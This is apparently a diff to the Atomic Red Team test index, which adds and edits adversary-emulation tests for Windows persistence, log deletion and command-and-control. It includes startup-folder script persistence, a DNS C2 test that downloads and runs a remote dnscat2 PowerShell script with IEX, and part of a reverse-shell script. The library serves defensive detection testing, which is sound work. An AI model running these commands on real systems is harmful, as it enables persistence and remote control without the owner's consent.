@@ -2939,36 +2939,6 @@ persistence:
           REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
           del #{script_path} >nul 2>nul
           del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
-    - name: Startup Folder Script
-      description: 'A batch file created to run on startup when placed in the start
-        menu folder
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_command:
-          description: Path to .bat file
-          type: String
-          default: echo Art `"Startup Folder Script`" atomic test for $env:USERNAME
-            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
-        system_command:
-          description: Command To Execute
-          type: String
-          default: echo Art `"Startup Folder Script`" atomic test for $env:COMPUTERNAME
-            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
-          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{user_command}"
-          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
-          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{system_command}"
-        cleanup_command: |
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
-          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
-          Remove-Item "$env:USERPROFILE\desktop\T1037-log.txt" -ErrorAction Ignore
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
@@ -2999,9 +2969,9 @@ persistence:
           \ touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4.
           Populate the plist with the location of your shell script\n\n\t  defaults
           write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n"
-    - name: File Ending with .jse in Startup Folder
-      description: 'Malware can create .jse files in the startup folder to establish
-        persistence
+    - name: Supicious vbs file run from startup Folder
+      description: 'vbs files can be placed in and ran from the startup folder to
+        maintain persistance
 
 '
       supported_platforms:
@@ -3010,11 +2980,49 @@ persistence:
         name: powershell
         elevation_required: true
         command: |
-          New-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\T1165globalstartup.jse"
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1165userstartup.jse"
+          Copy-Item $PathToAtomicsFolder\T1037\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+          Copy-Item $PathToAtomicsFolder\T1037\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
+          cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+          cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
         cleanup_command: |
-          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\T1165globalstartup.jse"
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1165userstartup.jse"
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
+          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
+    - name: Supicious jse file run from startup Folder
+      description: 'jse files can be placed in and ran from the startup folder to
+        maintain persistance
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1037\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+          Copy-Item $PathToAtomicsFolder\T1037\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+          cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+          cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+        cleanup_command: |
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
+          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
+    - name: Supicious bat file run from startup Folder
+      description: 'bat files can be placed in and ran from the startup folder to
+        maintain persistance
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+          Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+          Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+          Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+        cleanup_command: |
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
+          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
   T1031:
     technique:
       x_mitre_permissions_required:
@@ -3286,11 +3294,12 @@ persistence:
         name: powershell
         elevation_required: true
         command: |
-          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
+          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}" 2>&1 | Out-Null
           Start-Service -Name "#{service_name}"
-        cleanup_command: |
-          Stop-Service -Name "#{service_name}"
-          (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
+        cleanup_command: |-
+          Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
+          try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
+          catch {}
   T1137:
     technique:
       x_mitre_data_sources:
@@ -4146,6 +4155,7 @@ persistence:
           $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
           Register-ScheduledTask AtomicTask -InputObject $object
         cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
+          >$null 2>&1
 
 '
   T1180:
@@ -4681,7 +4691,7 @@ persistence:
         name: command_prompt
         elevation_required: false
         command: 'echo [InternetShortcut] > test.url && echo URL=C:\windows\system32\calc.exe
-          >> #{shortcut_file_path} && #{shortcut_file_path}
+          >> #{shortcut_file_path} && #{shortcut_file_path} >nul 2>&1
 
 '
     - name: Create shortcut to cmd in startup folders
@@ -4710,8 +4720,8 @@ persistence:
           $ShortCut.Description = "T1023.";
           $ShortCut.Save()
         cleanup_command: |
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk"
-          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk"
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk" -ErrorAction Ignore
+          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk" -ErrorAction Ignore
   T1165:
     technique:
       x_mitre_permissions_required:
@@ -5280,7 +5290,7 @@ persistence:
 
 '
         cleanup_command: 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows
-          NT\CurrentVersion\Winlogon\" -Name "Shell" -Force
+          NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
 
 '
     - name: Winlogon Userinit Key Persistence - PowerShell
@@ -5303,7 +5313,7 @@ persistence:
 
 '
         cleanup_command: 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows
-          NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force
+          NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
 
 '
     - name: Winlogon Notify Key Logon Persistence - PowerShell
@@ -5325,7 +5335,7 @@ persistence:
           New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
           Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force
         cleanup_command: 'Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
-          -Force
+          -Force -ErrorAction Ignore
 
 '
 defense-evasion:
@@ -7602,6 +7612,26 @@ defense-evasion:
           -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
 
 '
+    - name: Delete TeamViewer Log Files
+      description: |
+        Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.
+        This test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer
+        log file format of TeamViewerXX_Logfile.log
+        https://twitter.com/SBousseaden/status/1197524463304290305?s=20
+      supported_platforms:
+      - windows
+      - macos
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if ($env:os -eq "Windows_NT") {
+            New-Item $env:TEMP\TeamViewer_54.log
+            Remove-Item $env:TEMP\TeamViewer_54.log
+          } else {
+            New-Item $env:HOME\TeamViewer_54.log
+            Remove-Item $env:HOME\TeamViewer_54.log
+          }
   T1222:
     technique:
       x_mitre_data_sources:
@@ -9477,7 +9507,7 @@ defense-evasion:
           copy #{inputfile} #{outputfile}
           $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
           Stop-Process -ID $myT1036
-        cleanup_command: 'del #{outputfile}
+        cleanup_command: 'Remove-Item #{outputfile} -Force -ErrorAction Ignore
 
 '
     - name: Masquerading - windows exe running as different windows exe
@@ -9503,7 +9533,7 @@ defense-evasion:
           copy #{inputfile} #{outputfile}
           $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
           Stop-Process -ID $myT1036
-        cleanup_command: 'del #{outputfile}
+        cleanup_command: 'Remove-Item #{outputfile} -Force -ErrorAction Ignore
 
 '
     - name: Malicious process Masquerading as LSM.exe
@@ -10368,10 +10398,8 @@ defense-evasion:
 
           Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
           powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
-        cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
-          -Name #{registry_entry_storage}
-
-'
+        cleanup_command: 'Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage}
+          -Name #{registry_entry_storage}'
   T1502:
     technique:
       x_mitre_data_sources:
@@ -14362,11 +14390,12 @@ privilege-escalation:
         name: powershell
         elevation_required: true
         command: |
-          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
+          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}" 2>&1 | Out-Null
           Start-Service -Name "#{service_name}"
-        cleanup_command: |
-          Stop-Service -Name "#{service_name}"
-          (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
+        cleanup_command: |-
+          Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
+          try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
+          catch {}
   T1502:
     technique:
       x_mitre_data_sources:
@@ -15104,6 +15133,7 @@ privilege-escalation:
           $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
           Register-ScheduledTask AtomicTask -InputObject $object
         cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
+          >$null 2>&1
 
 '
   T1058:
@@ -16793,7 +16823,7 @@ discovery:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} #{input_source_code}
           #{output_file_name}
-        cleanup_command: 'del #{output_file_name}
+        cleanup_command: 'del /f /q /s #{output_file_name} >nul 2>&1
 
 '
   T1217:
@@ -19019,7 +19049,7 @@ discovery:
         command: 'net.exe start >> #{output_file}
 
 '
-        cleanup_command: 'del #{output_file}
+        cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1
 
 '
   T1124:
@@ -23119,6 +23149,7 @@ execution:
           $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
           Register-ScheduledTask AtomicTask -InputObject $object
         cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
+          >$null 2>&1
 
 '
   T1064:
@@ -24735,36 +24766,6 @@ lateral-movement:
           REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
           del #{script_path} >nul 2>nul
           del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
-    - name: Startup Folder Script
-      description: 'A batch file created to run on startup when placed in the start
-        menu folder
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_command:
-          description: Path to .bat file
-          type: String
-          default: echo Art `"Startup Folder Script`" atomic test for $env:USERNAME
-            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
-        system_command:
-          description: Command To Execute
-          type: String
-          default: echo Art `"Startup Folder Script`" atomic test for $env:COMPUTERNAME
-            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
-          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{user_command}"
-          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
-          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{system_command}"
-        cleanup_command: |
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
-          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
-          Remove-Item "$env:USERPROFILE\desktop\T1037-log.txt" -ErrorAction Ignore
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
@@ -24795,9 +24796,9 @@ lateral-movement:
           \ touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4.
           Populate the plist with the location of your shell script\n\n\t  defaults
           write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n"
-    - name: File Ending with .jse in Startup Folder
-      description: 'Malware can create .jse files in the startup folder to establish
-        persistence
+    - name: Supicious vbs file run from startup Folder
+      description: 'vbs files can be placed in and ran from the startup folder to
+        maintain persistance
 
 '
       supported_platforms:
@@ -24806,11 +24807,49 @@ lateral-movement:
         name: powershell
         elevation_required: true
         command: |
-          New-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\T1165globalstartup.jse"
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1165userstartup.jse"
+          Copy-Item $PathToAtomicsFolder\T1037\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+          Copy-Item $PathToAtomicsFolder\T1037\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
+          cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+          cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
         cleanup_command: |
-          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\T1165globalstartup.jse"
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1165userstartup.jse"
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
+          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
+    - name: Supicious jse file run from startup Folder
+      description: 'jse files can be placed in and ran from the startup folder to
+        maintain persistance
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1037\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+          Copy-Item $PathToAtomicsFolder\T1037\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+          cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+          cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+        cleanup_command: |
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
+          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
+    - name: Supicious bat file run from startup Folder
+      description: 'bat files can be placed in and ran from the startup folder to
+        maintain persistance
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+          Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+          Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+          Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+        cleanup_command: |
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
+          Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
   T1075:
     technique:
       x_mitre_data_sources:
@@ -25423,14 +25462,19 @@ lateral-movement:
           description: URL of file to copy
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
-        local_path:
-          description: Local path to place file
+        destination_path:
+          description: Destination path to file
           type: Path
-          default: Atomic-license.txt
+          default: "$env:TEMP\\Atomic-license.txt"
       executor:
-        name: command_prompt
-        command: (New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
-          "#{local_path}")
+        name: powershell
+        command: '(New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
+          "#{destination_path}")
+
+'
+        cleanup_command: 'Remove-Item #{destination_path} -Force -ErrorAction Ignore
+
+'
   T1077:
     technique:
       x_mitre_permissions_required:
@@ -26643,7 +26687,7 @@ exfiltration:
         command: 'dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
 
 '
-        cleanup_command: 'Remove-Item -path #{output_file}
+        cleanup_command: 'Remove-Item -path #{output_file} -ErrorAction Ignore
 
 '
     - name: Compress Data for Exfiltration With Rar
@@ -26686,7 +26730,7 @@ exfiltration:
         command: '"#{rar_exe}" a -r #{output_file} #{input_path} *#{file_extension}
 
 '
-        cleanup_command: 'del #{output_file}
+        cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1
 
 '
     - name: Data Compressed - nix - zip
@@ -27156,57 +27200,59 @@ command-and-control:
   '':
     technique:
       x_mitre_data_sources:
-      - Host network interface
-      - Netflow/Enclave netflow
       - Network intrusion detection system
       - Network protocol analysis
-      - Packet capture
       - Process use of network
-      name: Standard Non-Application Layer Protocol
+      - Process monitoring
+      x_mitre_permissions_required:
+      - User
+      name: Remote Access Tools
       description: |-
-        Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).
+        An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)
 
-        ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.
-      id: attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b
+        Remote access tools may be established and used post-compromise as alternate communications channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.
+
+        Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)
+      id: attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7
       x_mitre_contributors:
-      - Ryan Becwar
+      - Matt Kelly, @breakersall
       x_mitre_platforms:
-      - Windows
       - Linux
+      - Windows
       - macOS
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
       type: attack-pattern
       x_mitre_detection: |-
-        Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.
+        Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.
 
-        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.
 
-        Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.
+        [Domain Fronting](https://attack.mitre.org/techniques/T1172) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
       x_mitre_network_requirements: true
-      created: '2017-05-31T21:31:10.728Z'
+      created: '2018-04-18T17:59:24.739Z'
       kill_chain_phases:
       - kill_chain_name: mitre-attack
         phase_name: command-and-control
       external_references:
-      - external_id: T1095
+      - external_id: T1219
         source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1095
-      - source_name: Wikipedia OSI
-        description: Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved
-          December 4, 2014.
-        url: http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29
-      - source_name: Microsoft ICMP
-        description: Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics.
-          Retrieved December 1, 2014.
-        url: http://support.microsoft.com/KB/170292
-      - source_name: University of Birmingham C2
-        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
-          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
-        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
-      modified: '2019-07-18T21:18:02.753Z'
+        url: https://attack.mitre.org/techniques/T1219
+      - source_name: Symantec Living off the Land
+        description: Wueest, C., Anand, H. (2017, July). Living off the land and fileless
+          attack techniques. Retrieved April 10, 2018.
+        url: https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
+      - source_name: CrowdStrike 2015 Global Threat Report
+        description: CrowdStrike Intelligence. (2016). 2015 Global Threat Report.
+          Retrieved April 11, 2018.
+        url: https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf
+      - source_name: CrySyS Blog TeamSpy
+        description: CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’
+          tolko s razreshenija S-a. Retrieved April 11, 2018.
+        url: https://blog.crysys.hu/2013/03/teamspy/
+      modified: '2019-07-18T17:42:08.766Z'
     atomic_tests: []
   T1090:
     technique:
@@ -27703,14 +27749,19 @@ command-and-control:
           description: URL of file to copy
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
-        local_path:
-          description: Local path to place file
+        destination_path:
+          description: Destination path to file
           type: Path
-          default: Atomic-license.txt
+          default: "$env:TEMP\\Atomic-license.txt"
       executor:
-        name: command_prompt
-        command: (New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
-          "#{local_path}")
+        name: powershell
+        command: '(New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
+          "#{destination_path}")
+
+'
+        cleanup_command: 'Remove-Item #{destination_path} -Force -ErrorAction Ignore
+
+'
   T1071:
     technique:
       x_mitre_data_sources:
@@ -27907,6 +27958,30 @@ command-and-control:
         command: |
           Set-Location $PathToAtomicsFolder
           .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+    - name: DNS C2
+      description: |
+        This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
+        The following blogs have more information.
+        https://github.com/iagox86/dnscat2
+        https://github.com/lukebaggett/dnscat2-powershell
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Domain Name configured to use DNS Server where your C2 listener
+            is running
+          type: string
+          default: example.com
+        server_ip:
+          description: IP address of DNS server where your C2 listener is running
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |-
+          IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
+          Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
   T1032:
     technique:
       x_mitre_data_sources:
@@ -28004,6 +28079,135 @@ command-and-control:
           $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
           $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
           $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
+  T1095:
+    technique:
+      x_mitre_data_sources:
+      - Host network interface
+      - Netflow/Enclave netflow
+      - Network intrusion detection system
+      - Network protocol analysis
+      - Packet capture
+      - Process use of network
+      name: Standard Non-Application Layer Protocol
+      description: |-
+        Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).
+
+        ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.
+      id: attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b
+      x_mitre_contributors:
+      - Ryan Becwar
+      x_mitre_platforms:
+      - Windows
+      - Linux
+      - macOS
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.
+
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+
+        Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_network_requirements: true
+      created: '2017-05-31T21:31:10.728Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      external_references:
+      - external_id: T1095
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1095
+      - source_name: Wikipedia OSI
+        description: Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved
+          December 4, 2014.
+        url: http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29
+      - source_name: Microsoft ICMP
+        description: Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics.
+          Retrieved December 1, 2014.
+        url: http://support.microsoft.com/KB/170292
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      modified: '2019-07-18T21:18:02.753Z'
+      identifier: T1095
+    atomic_tests:
+    - name: ICMP C2
+      description: |
+        This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
+        refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
+      supported_platforms:
+      - windows
+      input_arguments:
+        server_ip:
+          description: The IP address of the listening server
+          type: ip
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
